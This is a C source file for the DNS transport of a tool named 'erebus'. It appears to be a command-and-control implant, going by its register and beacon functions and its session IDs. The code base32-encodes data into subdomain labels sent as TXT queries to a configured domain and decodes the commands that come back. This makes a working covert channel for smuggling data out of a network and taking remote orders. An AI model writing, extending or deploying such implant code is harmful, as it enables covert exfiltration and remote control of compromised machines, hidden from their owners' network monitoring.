#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>

#include "erebus/config.h"
#include "erebus/dns_chunk.h"
#include "erebus/transport.h"

/* Minimal base32 (RFC 4648, no padding) */
static const char b32_enc[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

static size_t b32_encode(const uint8_t *in, size_t in_len, char *out, size_t out_cap) {
    size_t o = 0;
    int buffer = 0, bits = 0;
    for (size_t i = 0; i < in_len; i++) {
        buffer = (buffer << 8) | in[i];
        bits += 8;
        while (bits >= 5) {
            if (o + 1 >= out_cap) return 0;
            out[o++] = b32_enc[(buffer >> (bits - 5)) & 31];
            bits -= 5;
        }
    }
    if (bits > 0 && o + 1 < out_cap)
        out[o++] = b32_enc[(buffer << (5 - bits)) & 31];
    out[o] = '\0';
    return o;
}

static int b32_decode_char(char c) {
    if (c >= 'a' && c <= 'z') c = (char)(c - 32);
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= '2' && c <= '7') return c - '2' + 26;
    return -1;
}

static size_t b32_decode(const char *in, uint8_t *out, size_t out_cap) {
    size_t o = 0;
    int buffer = 0, bits = 0;
    for (size_t i = 0; in[i]; i++) {
        int v = b32_decode_char(in[i]);
        if (v < 0) continue;
        buffer = (buffer << 5) | v;
        bits += 5;
        if (bits >= 8) {
            if (o >= out_cap) return 0;
            out[o++] = (uint8_t)((buffer >> (bits - 8)) & 0xFF);
            bits -= 8;
        }
    }
    return o;
}

typedef struct dns_ctx {
    char domain[256];
    char server[64];
    char session_id[64];
    int sock;
    struct sockaddr_in addr;
} dns_ctx;

static int dns_send_query(dns_ctx *ctx, const char *qname, uint8_t **resp, size_t *resp_len) {
    uint8_t packet[512];
    memset(packet, 0, sizeof(packet));
    packet[0] = 0x12; packet[1] = 0x34;
    packet[2] = 0x01; packet[3] = 0x00;
    packet[4] = 0x00; packet[5] = 0x01;
    size_t pos = 12;
    const char *label = qname;
    while (*label) {
        const char *dot = strchr(label, '.');
        size_t len = dot ? (size_t)(dot - label) : strlen(label);
        if (len > 63 || pos + 1 + len > sizeof(packet) - 5) return 0;
        packet[pos++] = (uint8_t)len;
        memcpy(packet + pos, label, len);
        pos += len;
        if (!dot) break;
        label = dot + 1;
    }
    packet[pos++] = 0;
    packet[pos++] = 0x00; packet[pos++] = 0x10;
    packet[pos++] = 0x00; packet[pos++] = 0x01;

    sendto(ctx->sock, packet, pos, 0, (struct sockaddr *)&ctx->addr, sizeof(ctx->addr));

    uint8_t rbuf[4096];
    ssize_t rlen = recvfrom(ctx->sock, rbuf, sizeof(rbuf), 0, NULL, NULL);
    if (rlen < 12) return 0;

    size_t p = 12;
    while (p < (size_t)rlen && rbuf[p]) {
        if ((rbuf[p] & 0xC0) == 0xC0) { p += 2; break; }
        p += 1 + rbuf[p];
    }
    if (p < (size_t)rlen && rbuf[p] == 0) p++;
    p += 4;
    if (p + 10 >= (size_t)rlen) return 0;
    p += 10;
    if (p >= (size_t)rlen) return 0;
    uint16_t rdlen = (uint16_t)(rbuf[p] << 8 | rbuf[p + 1]);
    p += 2;
    if (p + rdlen > (size_t)rlen) return 0;
    size_t rdata_end = p + rdlen;

    /* TXT RDATA: series of length-prefixed strings. Bound by RDATA end and stack buffer. */
    char b32[2048] = {0};
    size_t bi = 0;
    while (p < rdata_end) {
        uint8_t slen = rbuf[p++];
        if ((size_t)slen > rdata_end - p) return 0;
        if (bi + (size_t)slen >= sizeof(b32)) return 0;
        memcpy(b32 + bi, rbuf + p, slen);
        bi += slen;
        p += slen;
    }
    for (size_t i = 0; i < bi; i++)
        if (b32[i] >= 'a' && b32[i] <= 'z') b32[i] = (char)(b32[i] - 32);

    uint8_t *dec = (uint8_t *)malloc(bi);
    if (!dec) return 0;
    size_t dlen = b32_decode(b32, dec, bi);
    *resp = dec;
    *resp_len = dlen;
    return 1;
}

static int dns_exchange(dns_ctx *ctx, const uint8_t *req, size_t req_len, const char *session_label, uint8_t **resp, size_t *resp_len) {
    char b32[4096];
    if (!b32_encode(req, req_len, b32, sizeof(b32))) return 0;

    int max_chunk = erebus_dns_max_chunk_len(session_label, ctx->domain);
    if (max_chunk <= 0) return 0;

    size_t chunks = (strlen(b32) + (size_t)max_chunk - 1) / (size_t)max_chunk;
    uint8_t *combined = NULL;
    size_t combined_len = 0;

    for (size_t i = 0; i < chunks; i++) {
        char chunk[64];
        size_t off = i * (size_t)max_chunk;
        size_t clen = strlen(b32 + off);
        if (clen > (size_t)max_chunk) clen = (size_t)max_chunk;
        memcpy(chunk, b32 + off, clen);
        chunk[clen] = '\0';

        char qname[512];
        erebus_dns_build_query(qname, sizeof(qname), (int)i, (int)chunks, chunk, session_label, ctx->domain);

        uint8_t *part = NULL;
        size_t part_len = 0;
        if (!dns_send_query(ctx, qname, &part, &part_len)) {
            free(combined);
            return 0;
        }
        if (part_len > 0) {
            uint8_t *n = (uint8_t *)realloc(combined, combined_len + part_len);
            if (!n) { free(part); free(combined); return 0; }
            combined = n;
            memcpy(combined + combined_len, part, part_len);
            combined_len += part_len;
        }
        free(part);
    }
    *resp = combined;
    *resp_len = combined_len;
    return 1;
}

static int dns_register(erebus_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
    dns_ctx *ctx = (dns_ctx *)t->ctx;
    return dns_exchange(ctx, req, req_len, "reg", resp, resp_len);
}

static int dns_beacon(erebus_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
    dns_ctx *ctx = (dns_ctx *)t->ctx;
    return dns_exchange(ctx, req, req_len, ctx->session_id, resp, resp_len);
}

static void dns_destroy(erebus_transport *t) {
    dns_ctx *ctx = (dns_ctx *)t->ctx;
    if (ctx) {
        if (ctx->sock >= 0) close(ctx->sock);
    }
    free(ctx);
    free(t);
}

static void dns_set_session_id(erebus_transport *t, const char *session_id) {
    dns_ctx *ctx = (dns_ctx *)t->ctx;
    if (!ctx || !session_id) return;
    memset(ctx->session_id, 0, sizeof(ctx->session_id));
    strncpy(ctx->session_id, session_id, sizeof(ctx->session_id) - 1);
}

static const erebus_transport_ops dns_ops = {
    dns_register,
    dns_beacon,
    dns_destroy,
    dns_set_session_id,
};

int erebus_transport_create_dns(erebus_transport **out) {
    erebus_transport *t = (erebus_transport *)calloc(1, sizeof(*t));
    dns_ctx *ctx = (dns_ctx *)calloc(1, sizeof(*ctx));
    if (!t || !ctx) { free(t); free(ctx); return 0; }
    ctx->sock = -1;

    strncpy(ctx->domain, EREBUS_DNS_DOMAIN, sizeof(ctx->domain) - 1);
    if (ctx->domain[0] && ctx->domain[strlen(ctx->domain) - 1] != '.') {
        strncat(ctx->domain, ".", sizeof(ctx->domain) - strlen(ctx->domain) - 1);
    }
    strncpy(ctx->server, EREBUS_DNS_SERVER[0] ? EREBUS_DNS_SERVER : "8.8.8.8:53", sizeof(ctx->server) - 1);

    char host[64] = "8.8.8.8";
    int port = 53;
    char *colon = strchr(ctx->server, ':');
    if (colon) {
        size_t hlen = (size_t)(colon - ctx->server);
        if (hlen < sizeof(host)) {
            memcpy(host, ctx->server, hlen);
            host[hlen] = '\0';
        }
        port = atoi(colon + 1);
    }

    ctx->sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (ctx->sock < 0) { free(t); free(ctx); return 0; }
    ctx->addr.sin_family = AF_INET;
    ctx->addr.sin_port = htons((uint16_t)port);
    inet_pton(AF_INET, host, &ctx->addr.sin_addr);

    t->ops = &dns_ops;
    t->ctx = ctx;
    *out = t;
    return 1;
}